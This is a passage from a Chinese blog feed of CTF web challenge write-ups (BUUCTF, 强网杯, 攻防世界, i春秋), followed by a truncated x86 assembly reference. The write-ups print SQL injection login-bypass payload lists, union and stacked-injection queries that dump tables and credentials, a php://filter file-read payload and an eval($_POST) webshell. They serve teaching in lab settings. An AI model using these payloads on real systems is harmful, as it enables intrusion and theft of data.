        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>这是一道sql注入的题</p><p>进入题目  两个输入框 用户名，密码</p><p>猜测弱密码，admin passwd 不行</p><p>输入’报错  可以注入</p><p>这里可以用万能密码注入</p><p>php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">'or 1=1/&lt;br/&gt;"or "a"="a&lt;br/&gt;"or 1=1--&lt;br/&gt;"or"="&lt;br/&gt;"or"="a'='a&lt;br/&gt;"or1=1--&lt;br/&gt;"or=or"&lt;br/&gt;''or'='or'&lt;br/&gt;') or ('a'='a&lt;br/&gt;'.).or.('.a.'='.a&lt;br/&gt;'or 1=1&lt;br/&gt;'or 1=1--&lt;br/&gt;'or 1=1/&lt;br/&gt;'or"="a'='a&lt;br/&gt;'or' '1'='1'&lt;br/&gt;'or''='&lt;br/&gt;'or''=''or''='&lt;br/&gt;'or'='1'&lt;br/&gt;'or'='or'&lt;br/&gt;'or.'a.'='a&lt;br/&gt;'or1=1--&lt;br/&gt;1'or'1'='1&lt;br/&gt;a'or' 1=1--&lt;br/&gt;a'or'1=1--&lt;br/&gt;or 'a'='a'&lt;br/&gt;or 1=1--&lt;br/&gt;or1=1--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>asp</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">"or "a"="a&lt;br/&gt;'.).or.('.a.'='.a &lt;br/&gt;or 1=1--&lt;br/&gt;'or 1=1--&lt;br/&gt;a'or' 1=1--&lt;br/&gt;"or 1=1--&lt;br/&gt;'or.'a.'='a&lt;br/&gt;"or"="a'='a&lt;br/&gt;'or''='&lt;br/&gt;or'='or'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>jsp</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">1'or'1'='1&lt;br/&gt;admin' or 1=1/*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>猜测sql语句</p><p>username=’uesrname’ and passwd=’password’</p><p>构造payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span>admin<span class="token string single-quoted-string">' or '</span><span class="token number">1</span><span class="token string single-quoted-string">'='</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token string single-quoted-string">' or '</span><span class="token number">1</span><span class="token string single-quoted-string">'='</span><span class="token number">1</span>check<span class="token operator">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>1后面’和前面的闭合</p><p>成功</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 Knife</title>
      <link href="/2021/03/01/ji-ke-da-tiao-zhan-2019-knife/"/>
      <url>/2021/03/01/ji-ke-da-tiao-zhan-2019-knife/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"Syc"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找菜刀，再结合这个<code>eval($_POST["Syc"]);</code>后门</p><p>用蚁剑连接，密码Syc</p><p>发现flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 LoveSQL</title>
      <link href="/2021/03/01/ji-ke-da-tiao-zhan-2019-lovesql/"/>
      <url>/2021/03/01/ji-ke-da-tiao-zhan-2019-lovesql/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>尝试万能密码登录</p><p><code>Hello admin！Your password is '1eb26772fe42a42d3ef6a247e970d1ee'</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadcheck<span class="token operator">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token string single-quoted-string">' or '</span><span class="token number">1</span><span class="token string single-quoted-string">'='</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span><span class="token comment">//登录成功，并没有什么东西</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>加<code>'</code>报错，经排查，没有过滤限制，直接注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' order by 4 %23&amp;password=2Unknown column '</span><span class="token number">4</span><span class="token string">' in '</span><span class="token keyword">order</span> clause'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>Login Success<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,3 %23&amp;password=2Hello 2！Your password is '</span><span class="token number">3</span>'<span class="token comment">//两个回显点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,version(),database() %23&amp;password=2Hello 10.3.18-MariaDB！Your password is '</span>geek'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1)%23&amp;password=2Hello 2！Your password is '</span>geekuser<span class="token string">'check.php?username='</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>Hello <span class="token number">2</span>！Your password <span class="token operator">is</span> <span class="token string">'l0ve1ysq1'</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;password=2Hello 2！Your password is '</span>geekuser<span class="token punctuation">,</span>l0ve1ysq1'<span class="token comment">//一步到位</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='</span>l0ve1ysq1<span class="token string">')%23&amp;password=2Hello 2！Your password is '</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token string">'check.php?username='</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'geekuser'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>Hello <span class="token number">2</span>！Your password <span class="token operator">is</span> <span class="token string">'id,username,password'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from l0ve1ysq1)%23&amp;password=2Hello 2！Your password is '</span>cl4y<span class="token operator">~</span>wo_tai_nan_le<span class="token punctuation">,</span>glzjin<span class="token operator">~</span>glzjin_wants_a_girlfriend<span class="token punctuation">,</span>Z4cHAr7zCr<span class="token operator">~</span>biao_ge_dddd_hm<span class="token punctuation">,</span><span class="token number">0</span>xC4m3l<span class="token operator">~</span>linux_chuang_shi_ren<span class="token punctuation">,</span>Ayrain<span class="token operator">~</span>a_rua_rain<span class="token punctuation">,</span>Akko<span class="token operator">~</span>yan_shi_fu_de_mao_bo_he<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>cl4y<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_2_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_3_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_4_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_5_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_6_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_7_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_8_kuai_fu_ji<span class="token punctuation">,</span>leixiao<span class="token operator">~</span>Syc_san_da_hacker<span class="token punctuation">,</span>flag<span class="token operator">~</span>Hello <span class="token number">2</span>！Your password <span class="token operator">is</span> <span class="token string">'cl4y~wo_tai_nan_le,glzjin~glzjin_wants_a_girlfriend,Z4cHAr7zCr~biao_ge_dddd_hm,0xC4m3l~linux_chuang_shi_ren,Ayrain~a_rua_rain,Akko~yan_shi_fu_de_mao_bo_he,fouc5~cl4y,fouc5~di_2_kuai_fu_ji,fouc5~di_3_kuai_fu_ji,fouc5~di_4_kuai_fu_ji,fouc5~di_5_kuai_fu_ji,fouc5~di_6_kuai_fu_ji,fouc5~di_7_kuai_fu_ji,fouc5~di_8_kuai_fu_ji,leixiao~Syc_san_da_hacker,flag~flag{b68743d7-102c-415c-82f9-447bff55b3f6}'</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 Secret File</title>
      <link href="/2021/03/01/ji-ke-da-tiao-zhan-2019-secret-file/"/>
      <url>/2021/03/01/ji-ke-da-tiao-zhan-2019-secret-file/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>查看源码</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>master<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./Archive_room.php<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">background-color</span><span class="token punctuation">:</span>#000000<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span>70px<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span>200px<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span>44%<span class="token punctuation">;</span><span class="token property">cursor</span><span class="token punctuation">:</span>default<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>Oh! You found me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击跳转到<code>./Archive_room.php</code></p><p><img src="https://images.dadream.eu.org/images/2024/07/ccc3ec28430f77f83eefd05eaf569342.png"></p><p>点击secret，跳转</p><p><img src="https://images.dadream.eu.org/images/2024/07/acd54d95db1b40434166dd8e32d196f9.png"></p><p>回到刚才页面，抓包看看</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">302</span> <span class="token reason-phrase string">Found</span></span><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">openresty</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Wed, 24 Feb 2021 08:46:54 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Location</span><span class="token punctuation">:</span> <span class="token header-value">end.php</span></span><span class="token header"><span class="token header-name keyword">X-Powered-By</span><span class="token punctuation">:</span> <span class="token header-value">PHP/7.3.11</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">63</span></span>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;!--   secr3t.php        --&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到重定向了</p><p>进入<code>secr3t.php </code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Oh no!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//flag放在了flag.php里</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了<code>../</code> <code>tp</code> <code>input</code> <code>data</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadsecr3t<span class="token operator">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解码得到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>               <span class="token keyword">echo</span> <span class="token string double-quoted-string">"我就在这里"</span><span class="token punctuation">;</span>               <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag{c09a95d6-8ff9-4c3f-be29-20c8f10d75de}'</span><span class="token punctuation">;</span>               <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'jiAng_Luyuan_w4nts_a_g1rIfri3nd'</span>           <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯_2019 随便注</title>
      <link href="/2021/03/01/qiang-wang-bei-2019-sui-bian-zhu/"/>
      <url>/2021/03/01/qiang-wang-bei-2019-sui-bian-zhu/</url>
      
        <content type="html"><![CDATA[<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>输入’报错</p><p><img src="https://images.dadream.eu.org/images/2024/07/d122e8e1ae90a3543da2e9e088e65646.gif"></p><p>用order by 查出有两个字段</p><p><img src="https://images.dadream.eu.org/images/2024/07/786b126cdf1527ff4f81c87b79a79db8.gif"><img src="https://images.dadream.eu.org/images/2024/07/234921c3884ebbaa6abd09bcc592e863.gif"></p><p>这里发现select被过滤，我绕不过</p><p><img src="https://images.dadream.eu.org/images/2024/07/4b57f7b01774a9d68cc5416849b296ee.gif"></p><p>试了一下能进行堆叠注入</p><p><img src="https://images.dadream.eu.org/images/2024/07/f6d85641fdaca60eed73876f24e5052f.gif"></p><p>查到两个表 1919810931114514、words</p><p>查询表中列</p><p>?inject=’;show columns from <code>1919810931114514</code> %23</p><p><img src="https://images.dadream.eu.org/images/2024/07/7a19bd0bd4933150a1874a46c1047074.jpg"></p><p>?inject=’;show columns from <code>words</code> %23</p><p><img src="https://images.dadream.eu.org/images/2024/07/303abac6b9a079e574989f92493312be.jpg"></p><p>禁用了select，可以采用预编译来爆数据</p><p>这里存在大小写绕过</p><p><img src="https://images.dadream.eu.org/images/2024/07/e30b5f3754b22755d9b593a019cc9e3b.gif"></p><p><img src="https://images.dadream.eu.org/images/2024/07/cc1032d4bc15b41fc44cdc7549f4fe75.gif"></p><p>alter table words rename to words1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50);#</p><p>这种是猜测默认查words中的数据</p><p>此payload是将words改为words1，将1919810931114514改为words，将其中数据列也改为id varchar（50）</p><p>再通过’ or 1=1查全部数据</p><p><img src="https://images.dadream.eu.org/images/2024/07/986575bed9828014c2ebd1bd0d0459af.gif"></p><p><img src="https://images.dadream.eu.org/images/2024/07/f8d1607e2fe8d240a409ea1b8846c9ae.gif"></p><p>表名为数字时，要用反引号包起来查询</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Training_WWW_Robots</title>
      <link href="/2021/02/01/training-www-robots/"/>
      <url>/2021/02/01/training-www-robots/</url>
      
        <content type="html"><![CDATA[<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>进去就有提示</p><p>robots.txt文件是为了告诉爬虫程序或者搜索引擎哪些资源不能爬，你就可以从这些资源中找到你要用的,然后进行你的操作</p><p><img src="https://images.dadream.eu.org/images/2024/07/222e300c5fa4878935a83897809de571.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/f63d900073d5b263804b05a48a3efb27.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>baby_web</title>
      <link href="/2021/02/01/baby-web/"/>
      <url>/2021/02/01/baby-web/</url>
      
        <content type="html"><![CDATA[<h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h2><p>根据提示 初始页面 可以想到index（大部分正常网站都是index）尝试将url改为index.php，发现跳转到了1.php，说明被重定向了</p><p>第一种方法，浏览器中F12打开面板，在网络模块可以发现flag</p><p><img src="https://images.dadream.eu.org/images/2024/07/57cb640e2e7c8cd61ed769394b8f873d.png"></p><p>第二种直接用bp抓包，查看响应头flag</p><p><img src="https://images.dadream.eu.org/images/2024/07/61d9455f464c4c4361b18c8377145c70.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爆破-1</title>
      <link href="/2021/02/01/bao-po-1/"/>
      <url>/2021/02/01/bao-po-1/</url>
      
        <content type="html"><![CDATA[<h2 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破-1"></a>爆破-1</h2><p>进去后如下代码提示</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude "flag.php";$a = @$_REQUEST['hello'];if(!preg_match('/^\w*$/',$a )){  die('ERROR');}eval("var_dump($$a);");show_source(__FILE__);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$_REQUEST[‘hello’]</p><p>提交的参数是hello，前面提示在某个6位变量中，想到爆破，但是工作量很大</p><p>/^\w*$/ </p><p>^n   以n开头</p><p>n$  以n结尾</p><p>n*  匹配0个或者多个n</p><p>\w  查找单词字符  A_Z  a_z  0_9  _</p><p>正则过滤后爆破还是很大的工作量</p><p>eval(“var_dump($$a);”)</p><p>eavl()是代码执行函数，</p><p>var_dump() 函数将变量的类型、值、结构等信息打印出来</p><p>这里就可以是用全局变量$GLOBALS将所有变量打印出来</p><p><img src="https://images.dadream.eu.org/images/2024/07/9bc8ef5992e9bcaf2af7691be3c53d64.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32位汇编指令总结(代码示例)</title>
      <link href="/2021/01/03/zhi-ling/"/>
      <url>/2021/01/03/zhi-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="通用数据传送指令"><a href="#通用数据传送指令" class="headerlink" title="通用数据传送指令"></a>通用数据传送指令</h1><h3 id="MOV-传送字或字节"><a href="#MOV-传送字或字节" class="headerlink" title="MOV 传送字或字节"></a>MOV 传送字或字节</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,10h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MOVSX-先符号扩展-再传送"><a href="#MOVSX-先符号扩展-再传送" class="headerlink" title="MOVSX 先符号扩展,再传送"></a>MOVSX 先符号扩展,再传送</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">movsx eax,ax;先进行全零扩展,前16位为F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MOVZX-先零扩展-再传送"><a href="#MOVZX-先零扩展-再传送" class="headerlink" title="MOVZX 先零扩展,再传送"></a>MOVZX 先零扩展,再传送</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">movzx eax,ax;先进行全零扩展,前16位为0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PUSH-把字压入堆栈"><a href="#PUSH-把字压入堆栈" class="headerlink" title="PUSH 把字压入堆栈"></a>PUSH 把字压入堆栈</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">push reg/nem16   32push imm32<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="POP-把字弹出堆栈"><a href="#POP-把字弹出堆栈" class="headerlink" title="POP 把字弹出堆栈"></a>POP 把字弹出堆栈</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">pop reg/nem16  32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PUSHFD-把32EFLAGS寄存器内容压入堆栈"><a href="#PUSHFD-把32EFLAGS寄存器内容压入堆栈" class="headerlink" title="PUSHFD 把32EFLAGS寄存器内容压入堆栈"></a>PUSHFD 把32EFLAGS寄存器内容压入堆栈</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">pushfd;保存标志寄存器内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="POPFD-把32EFLAGS寄存器内容弹出堆栈"><a href="#POPFD-把32EFLAGS寄存器内容弹出堆栈" class="headerlink" title="POPFD 把32EFLAGS寄存器内容弹出堆栈"></a>POPFD 把32EFLAGS寄存器内容弹出堆栈</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">popfd;恢复标志寄存器内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PUSHA-把AX-CX-DX-BX-SP-BP-SI-DI依次压入堆栈"><a href="#PUSHA-把AX-CX-DX-BX-SP-BP-SI-DI依次压入堆栈" class="headerlink" title="PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈"></a>PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">pusha;保存16通用寄存器内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="POPA-把DI-SI-BP-SP-BX-DX-CX-AX依次弹出堆栈"><a href="#POPA-把DI-SI-BP-SP-BX-DX-CX-AX依次弹出堆栈" class="headerlink" title="POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈"></a>POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">popa;恢复16通用寄存器内存<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PUSHAD-把EAX-ECX-EDX-EBX-ESP-EBP-ESI-EDI依次压入堆栈"><a href="#PUSHAD-把EAX-ECX-EDX-EBX-ESP-EBP-ESI-EDI依次压入堆栈" class="headerlink" title="PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈"></a>PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">pushad;保存32通用寄存器内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="POPAD-把EDI-ESI-EBP-ESP-EBX-EDX-ECX-EAX依次弹出堆栈"><a href="#POPAD-把EDI-ESI-EBP-ESP-EBX-EDX-ECX-EAX依次弹出堆栈" class="headerlink" title="POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈"></a>POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">popad;恢复32通用寄存器内存<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="BSWAP-交换32位寄存器里字节的顺序"><a 